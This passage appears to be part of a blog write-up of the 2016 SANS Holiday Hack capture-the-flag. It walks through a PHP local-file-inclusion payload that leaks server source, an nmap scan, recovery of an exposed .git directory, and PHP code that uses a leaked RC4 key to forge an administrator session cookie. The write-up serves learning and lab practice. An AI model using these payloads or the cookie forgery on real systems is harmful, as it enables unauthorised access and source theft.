+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"strace"</span><span class="o">,</span> <span class="n">Log</span><span class="o">.</span><span class="na">getStackTraceString</span><span class="o">(</span><span class="n">th</span><span class="o">));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"model"</span><span class="o">,</span> <span class="n">Build</span><span class="o">.</span><span class="na">MODEL</span><span class="o">);</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"sdkint"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">VERSION</span><span class="o">.</span><span class="na">SDK_INT</span><span class="o">));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"device"</span><span class="o">,</span> <span class="n">Build</span><span class="o">.</span><span class="na">DEVICE</span><span class="o">);</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"product"</span><span class="o">,</span> <span class="n">Build</span><span class="o">.</span><span class="na">PRODUCT</span><span class="o">);</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"lversion"</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.version"</span><span class="o">));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"vmheapsz"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">totalMemory</span><span class="o">()));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"vmallocmem"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">totalMemory</span><span class="o">()</span> <span class="o">-</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">freeMemory</span><span class="o">()));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"vmheapszlimit"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">maxMemory</span><span class="o">()));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"natallocmem"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">Debug</span><span class="o">.</span><span class="na">getNativeHeapAllocatedSize</span><span class="o">()));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"cpuusage"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">cpuUsage</span><span class="o">()));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"totalstor"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">totalStorage</span><span class="o">()));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"freestor"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">freeStorage</span><span class="o">()));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"busystor"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">busyStorage</span><span class="o">()));</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"udid"</span><span class="o">,</span> <span class="n">Secure</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">getContentResolver</span><span class="o">(),</span> <span class="s">"android_id"</span><span class="o">));</span>
+    <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"data"</span><span class="o">,</span> <span class="n">jSONObject2</span><span class="o">);</span>
+    <span class="k">new</span> <span class="nf">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">C09834</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">jSONObject</span><span class="o">)).</span><span class="na">start</span><span class="o">();</span>
+<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">JSONException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span> <span class="s">"Error posting message to "</span> <span class="o">+</span> <span class="n">getString</span><span class="o">(</span><span class="mi">2131165216</span><span class="o">)</span> <span class="o">+</span> <span class="s">" -- "</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+<span class="o">}</span>
+<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>This shows a JSON object is created with the <code class="highlighter-rouge">operation</code> key and another key called <code class="highlighter-rouge">data</code> where the value is a second JSON object with various system status for apparently when a crash occurs. Going back to <code class="highlighter-rouge">iPython</code>, lets add this data object and see what happens.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">10</span><span class="p">]:</span> <span class="n">writeDump</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="n">writeDump</span><span class="p">[</span><span class="s">'operation'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"WriteCrashDump"</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">12</span><span class="p">]:</span> <span class="n">writeDump</span><span class="p">[</span><span class="s">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"udid"</span><span class="p">:</span><span class="s">"what?"</span><span class="p">}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">13</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">writeDump</span><span class="p">)</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">14</span><span class="p">]:</span> <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+
+<span class="p">{</span>
+<span class="s">"success"</span> <span class="p">:</span> <span class="n">true</span><span class="p">,</span>
+<span class="s">"folder"</span> <span class="p">:</span> <span class="s">"docs"</span><span class="p">,</span>
+<span class="s">"crashdump"</span> <span class="p">:</span> <span class="s">"crashdump-lCpUot.php"</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p>So we have successfully written a crash dump with minimal information to the server. We now will try to develop a method to read it back. Once we have a working system, we will then attempt to exploit it.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">15</span><span class="p">]:</span> <span class="n">readDump</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">16</span><span class="p">]:</span> <span class="n">readDump</span><span class="p">[</span><span class="s">'operation'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"ReadCrashDump"</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">17</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">readDump</span><span class="p">)</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">18</span><span class="p">]:</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">18</span><span class="p">]:</span> <span class="s">u"Fatal error! JSON key 'data' must be set.</span><span class="se">\n</span><span class="s">"</span>
+</code></pre>
+</div>
+
+<p>We will assume that the data key will have a value that is another JSON object. Adding an empty JSON object, we get the following:</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">19</span><span class="p">]:</span> <span class="n">readDump</span><span class="p">[</span><span class="s">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">20</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">readDump</span><span class="p">)</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">21</span><span class="p">]:</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">21</span><span class="p">]:</span> <span class="s">u"Fatal error! JSON key 'crashdump' must be set.</span><span class="se">\n</span><span class="s">"</span>
+</code></pre>
+</div>
+
+<p>So one of the two JSON object needs a key of ‘crashdump’, we will add it to the inner object with an empty string as the value.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">22</span><span class="p">]:</span> <span class="n">readDump</span><span class="p">[</span><span class="s">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"crashdump"</span><span class="p">:</span><span class="s">" "</span><span class="p">}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">23</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">readDump</span><span class="p">)</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">24</span><span class="p">]:</span> <span class="n">data</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">24</span><span class="p">]:</span> <span class="s">'{"operation": "ReadCrashDump", "data": {"crashdump": ""}}'</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">25</span><span class="p">]:</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">25</span><span class="p">]:</span> <span class="s">u''</span>
+</code></pre>
+</div>
+
+<p>That is a good sign as we got no errors. We now will try to read back the crash dump we posted earlier. The returned JSON object from the write operation had a key of <code class="highlighter-rouge">crashdump</code> with a value of <code class="highlighter-rouge">crashdump-lCpUot.php</code>. We will use this file name as crashdump value in our inner JSON object.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">26</span><span class="p">]:</span> <span class="n">readDump</span><span class="p">[</span><span class="s">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"crashdump"</span><span class="p">:</span><span class="s">"crashdump-lCpUot.php"</span><span class="p">}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">27</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">readDump</span><span class="p">)</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">28</span><span class="p">]:</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">28</span><span class="p">]:</span> <span class="s">u"Fatal error! crashdump value duplicate '.php' extension detected.</span><span class="se">\n</span><span class="s">"</span>
+</code></pre>
+</div>
+
+<p>It appears the exception server does not like the <code class="highlighter-rouge">.php</code> file extension to be in <code class="highlighter-rouge">crashdump key</code>. Cleaning that up:</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">29</span><span class="p">]:</span> <span class="n">readDump</span><span class="p">[</span><span class="s">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"crashdump"</span><span class="p">:</span><span class="s">"crashdump-lCpUot"</span><span class="p">}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">30</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">readDump</span><span class="p">)</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">31</span><span class="p">]:</span> <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="p">{</span>
+ <span class="s">"udid"</span><span class="p">:</span> <span class="s">"what?"</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p>I tell you what I did… I just revealed your vulnerability. So when writing an crash dump, the system creates a <code class="highlighter-rouge">php</code> file that we then can retrieve with the read crash dump operation. Assuming this php file is not directly accessible from the webroot, it must be used in an include operation inside of exception.php. Let’s test this out:</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>wget http://ex.northpolewonderland.com/crashdump-lCpUot.php
+--2016-12-26 07:50:22-- http://ex.northpolewonderland.com/crashdump-lCpUot.php
+Resolving ex.northpolewonderland.com... 104.154.196.33
+Connecting to ex.northpolewonderland.com|104.154.196.33|:80... connected.
+HTTP request sent, awaiting response... 404 Not Found
+2016-12-26 07:50:22 ERROR 404: Not Found.
+</code></pre>
+</div>
+
+<p>Another recent SANS Pentest <a href="https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities">blog</a> post by Jeff McJunkin discusses exploiting local file inclusion vulnerabilities in PHP using the <code class="highlighter-rouge">php:// filter</code>. The recommended payload from the article is:</p>
+
+<blockquote>
+  <blockquote>
+    <p>page=php://filter/convert.base64-encode/resource=index</p>
+  </blockquote>
+</blockquote>
+
+<p>This situation arises when PHP code expects to have a POST or GET parameter called <code class="highlighter-rouge">page</code> equal to a file name that will have <code class="highlighter-rouge">.php</code> appended to and included in the execution to generate the output. If vulnerable the value returned from the above would be the base64 encoded source code of the <code class="highlighter-rouge">index.php</code> file. We will tweak this payload to get the source code of <code class="highlighter-rouge">exception.php</code> and pass this as the <code class="highlighter-rouge">crashdump</code> value in our inner JSON object.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">32</span><span class="p">]:</span> <span class="n">lfi</span> <span class="o">=</span> <span class="s">"php://filter/convert.base64-encode/resource=exception"</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">33</span><span class="p">]:</span> <span class="n">readDump</span><span class="p">[</span><span class="s">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"crashdump"</span><span class="p">:</span><span class="n">lfi</span><span class="p">}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">34</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">readDump</span><span class="p">)</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">35</span><span class="p">]:</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">35</span><span class="p">]:</span> <span class="s">u'PD9waHAgCgojIEF1ZGlvIGZpbGUgZnJvbSBEaXNjb21ib2J1bGF0b3IgaW4gd2Vicm9vdDogZGlzY29tYm9idWxhdGVkLWF1ZGlvLTYtWHl6RTNOOVlxS05ILm1wMwoKIyBDb2RlIGZyb20gaHR0cDovL3RoaXNpbnRlcmVzdHNtZS5jb20vcmVjZWl2aW5nLWpzb24tcG9zdC1kYXRhLXZpYS1waHAvCiMgTWFrZSBzdXJlIHRoYXQgaXQgaXMgYSBQT1NUIHJlcXVlc3QuCmlmKHN0cmNhc2VjbXAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10sICdQT1NUJykgIT0gMCl7CiAgICBkaWUoIlJlcXVlc3QgbWV0aG9kIG11c3QgYmUgUE9TVFxuIik7Cn0KCSAKIyBNYWtlIHN1cmUgdGhhdCB0aGUgY2 .......</span><span class="err">
+</span></code></pre>
+</div>
+
+<p>Boom! Now we will just decode that output and see what we have:</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">36</span><span class="p">]:</span> <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'base64'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+
+<span class="c"># Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3</span>
+
+<span class="c"># Code from http://thisinterestsme.com/receiving-json-post-data-via-php/</span>
+<span class="c"># Make sure that it is a POST request.</span>
+<span class="k">if</span><span class="p">(</span><span class="n">strcasecmp</span><span class="p">(</span><span class="err">$</span><span class="n">_SERVER</span><span class="p">[</span><span class="s">'REQUEST_METHOD'</span><span class="p">],</span> <span class="s">'POST'</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
+    <span class="n">die</span><span class="p">(</span><span class="s">"Request method must be POST</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="o">.....</span>
+</code></pre>
+</div>
+
+<p>I only show the first few lines, since the audio file is listed write above, but the entire file can be shown <a href="https://github.com/wcmoody/holidayhack/blob/master/exception.php">here</a>.</p>
+
+<p>So the audio file is located in the webroot at <code class="highlighter-rouge">discombobulated-audio-6-XyzE3N9YqKNH.mp3</code>. Downloading it with wget, we now have 6 of the 7 audio files.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>wget http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3
+--2016-12-26 08:13:44-- http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3
+Resolving ex.northpolewonderland.com... 104.154.196.33
+Connecting to ex.northpolewonderland.com|104.154.196.33|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 223244 <span class="o">(</span>218K<span class="o">)</span> <span class="o">[</span>audio/mpeg]
+Saving to: <span class="s1">'discombobulated-audio-6-XyzE3N9YqKNH.mp3'</span>
+
+discombobulated-audio-6-X 100%[<span class="o">======================================</span>&gt;] 218.01K 958KB/s <span class="k">in </span>0.2s
+
+2016-12-26 08:13:45 <span class="o">(</span>958 KB/s<span class="o">)</span> - <span class="s1">'discombobulated-audio-6-XyzE3N9YqKNH.mp3'</span> saved <span class="o">[</span>223244/223244]
+</code></pre>
+</div>
+
+<p>The name of the download file is <code class="highlighter-rouge">discombobulated-audio-6-XyzE3N9YqKNH.mp3</code></p>
+
+<h4 id="the-mobile-analytics-server-post-authentication">The Mobile Analytics Server (post authentication)</h4>
+
+<p>Returning to the Analytics Server, I know I have to exploit another audio file from this site. When I had initially targeted this server, I had conducted a nmap scan to attempt to enumerate the website. The results can be seen below:</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>nmap --script<span class="o">=</span>http-enum 104.198.252.157
+
+Starting Nmap 7.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2016-12-29 15:25 EST
+Nmap scan report <span class="k">for </span>157.252.198.104.bc.googleusercontent.com <span class="o">(</span>104.198.252.157<span class="o">)</span>
+Host is up <span class="o">(</span>0.067s latency<span class="o">)</span>.
+Not shown: 995 filtered ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+443/tcp  open  https
+| http-enum:
+|   /login.php: Possible admin folder
+|_  /.git/HEAD: Git folder
+554/tcp  open  rtsp
+7070/tcp open  realserver
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>37.31 seconds
+</code></pre>
+</div>
+
+<p>Knowing that you probably should not leave your <code class="highlighter-rouge">git</code> files on your web server, browsed to this URL to see what was there. Sure enough, all the hidden git files. Using the techniques outlined on this <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">blog</a>, I was able to automate the downloading of the entire <code class="highlighter-rouge">git</code> directory and restore the files. This gave me full source code for the website along with revision history.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ ls -la
+total 84
+drwxr-xr-x 27 Owner staff  918 Dec 29 20:27 .
+drwxr-xr-x 15 Owner staff  510 Dec 29 21:29 ..
+drwxr-xr-x 14 Owner staff  476 Dec 29 22:01 .git
+-rw-r--r--  1 Owner staff  310 Dec 28 22:37 README.md
+-rw-r--r--  1 Owner staff  290 Dec 28 22:37 crypto.php
+drwxr-xr-x 11 Owner staff  374 Dec 28 22:37 css
+-rw-r--r--  1 Owner staff 2958 Dec 28 22:37 db.php
+-rw-r--r--  1 Owner staff 2392 Dec 28 22:37 edit.php
+drwxr-xr-x  7 Owner staff  238 Dec 28 22:37 fonts
+-rw-r--r--  1 Owner staff   29 Dec 28 22:37 footer.php
+-rw-r--r--  1 Owner staff  935 Dec 29 20:16 functions.php
+-rw-r--r--  1 Owner staff 1191 Dec 28 22:37 getaudio.php
+-rw-r--r--  1 Owner staff 2000 Dec 28 22:37 header.php
+-rw-r--r--  1 Owner staff  819 Dec 28 22:37 index.php
+drwxr-xr-x  5 Owner staff  170 Dec 28 22:37 js
+-rw-r--r--  1 Owner staff 2913 Dec 28 22:37 login.php
+-rw-r--r--  1 Owner staff  174 Dec 28 22:37 logout.php
+-rw-r--r--  1 Owner staff  325 Dec 28 22:37 mp3.php
+drwxr-xr-x  3 Owner staff  102 Dec 29 20:13 out
+-rw-r--r--  1 Owner staff 7697 Dec 28 22:37 query.php
+-rw-r--r--  1 Owner staff 2252 Dec 28 22:37 report.php
+-rw-r--r--  1 Owner staff 5008 Dec 28 22:37 sprusage.sql
+drwxr-xr-x  5 Owner staff  170 Dec 28 22:37 test
+-rw-r--r--  1 Owner staff  629 Dec 28 22:37 this_is_html.php
+-rw-r--r--  1 Owner staff  739 Dec 28 22:37 this_is_json.php
+-rw-r--r--  1 Owner staff  647 Dec 28 22:37 uuid.php
+-rw-r--r--  1 Owner staff 1949 Dec 28 22:37 view.php
+</code></pre>
+</div>
+
+<p>The first thing I wanted to look at was the <code class="highlighter-rouge">sprusage.sql</code> file. It was the <code class="highlighter-rouge">sql</code> commands used to create the database for the site. Tables of interest initially were the <code class="highlighter-rouge">audio</code> and <code class="highlighter-rouge">users</code> table. I saw no inserts into either table though.</p>
+
+<p>After reviewing some of the basic pages like <code class="highlighter-rouge">index.php</code>, <code class="highlighter-rouge">login.php</code>, <code class="highlighter-rouge">header.php</code>, and <code class="highlighter-rouge">footer.php</code>, I began to focus on the crypto.php file. This file showed me the mechanism to create the <code class="highlighter-rouge">AUTH</code> session cookie. I exposed the crypto key and algorithm they used to create the key.</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'KEY'</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc</span><span class="s2">"</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">mcrypt_encrypt</span><span class="p">(</span><span class="nx">MCRYPT_ARCFOUR</span><span class="p">,</span> <span class="nx">KEY</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="s1">'stream'</span><span class="p">);</span>   
+<span class="p">}</span>
+    
+<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">mcrypt_decrypt</span><span class="p">(</span><span class="nx">MCRYPT_ARCFOUR</span><span class="p">,</span> <span class="nx">KEY</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="s1">'stream'</span><span class="p">);</span>   
+<span class="p">}</span> 
+    
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+
+<p>Also in <code class="highlighter-rouge">login.php</code>, I saw this code was used</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$auth</span> <span class="o">=</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">([</span>
+      <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span>
+      <span class="s1">'date'</span> <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="nx">DateTime</span><span class="o">::</span><span class="na">ISO8601</span><span class="p">),</span>
+    <span class="p">]));</span>
+
+    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'AUTH'</span><span class="p">,</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$auth</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+
+<p>I used this same method to forge a session cookie for the <code class="highlighter-rouge">administrator</code> account with the following snippet.</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+   <span class="nb">define</span><span class="p">(</span><span class="s1">'KEY'</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc</span><span class="s2">"</span><span class="p">);</span>   
+   
+   <span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>     <span class="k">return</span> <span class="nb">mcrypt_encrypt</span><span class="p">(</span><span class="nx">MCRYPT_ARCFOUR</span><span class="p">,</span> <span class="nx">KEY</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="s1">'stream'</span><span class="p">);</span>   <span class="p">}</span>   
+   
+   <span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>     <span class="k">return</span> <span class="nb">mcrypt_decrypt</span><span class="p">(</span><span class="nx">MCRYPT_ARCFOUR</span><span class="p">,</span> <span class="nx">KEY</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="s1">'stream'</span><span class="p">);</span>   <span class="p">}</span>   
+   
+   <span class="nv">$creds</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'username'</span><span class="o">=&gt;</span><span class="s1">'administrator'</span><span class="p">,</span>
+                  <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="nx">DateTime</span><span class="o">::</span><span class="na">ISO8601</span><span class="p">)</span> <span class="p">);</span>
+
+  <span class="nv">$auth</span> <span class="o">=</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$creds</span><span class="p">));</span>
+  <span class="k">echo</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$auth</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+
+<p>I was able to use the provided cookie in a cookie add-on in the browser to get authenticated as the <code class="highlighter-rouge">administrator</code>.</p>
+
+<p>Additionally, I was able to create a patch of all changes in each file for the website. The command to do this for the <code class="highlighter-rouge">sprusage.sql</code> file is below:</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code>git log -p sprusage.sql
+</code></pre>
+</div>
+
